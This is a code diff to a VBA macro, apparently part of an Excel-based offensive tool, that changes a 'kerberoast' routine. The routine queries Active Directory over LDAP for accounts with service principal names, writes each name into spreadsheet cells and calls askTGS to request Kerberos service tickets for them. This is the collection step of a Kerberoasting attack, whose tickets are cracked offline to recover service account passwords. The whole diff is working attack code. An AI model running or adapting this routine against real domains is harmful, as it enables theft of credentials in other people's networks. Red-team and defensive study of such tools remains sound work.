@@ -171,25 +171,29 @@ Sub kerberoast() 'https://www.remkoweijnen.nl/blog/2007/11/01/query-active-direc
     objConnection.Open "Provider=ADsDSOObject;"
 
     'Connection
-    Dim objCommand As ADODB.Command
     Set objCommand = CreateObject("ADODB.Command")
     objCommand.ActiveConnection = objConnection
 
     'Search the AD recursively, starting at root of the domain
     objCommand.CommandText = _
-        "<LDAP://" & strDomain & ">;(&(samAccountType=805306368)(servicePrincipalName=*));,servicePrincipalName;subtree"
-    Dim objRecordSet As ADODB.Recordset
+        "<LDAP://" & strDomain & ">;(&(objectclass=user)(servicePrincipalName=*));,servicePrincipalName;subtree"
     Set objRecordSet = objCommand.Execute
 
     Dim i As Long
 
     If objRecordSet.EOF And objRecordSet.BOF Then
     Else
+        Dim c As Integer
+        c = 1
         Do While Not objRecordSet.EOF
             For i = 0 To objRecordSet.Fields.Count - 1
-                askTGS (toStr(objRecordSet!servicePrincipalName(0)))
+                Cells(c, 1) = objRecordSet.Fields("servicePrincipalName").Value
+                Dim k As String
+                k = Cells(c, 1)
+                askTGS (k)
             Next i
             objRecordSet.MoveNext
+        c = c + 1
         Loop
     End If
 
@@ -201,3 +205,5 @@ Sub kerberoast() 'https://www.remkoweijnen.nl/blog/2007/11/01/query-active-direc
     Set objCommand = Nothing
     Set objConnection = Nothing
 End Sub
+
+
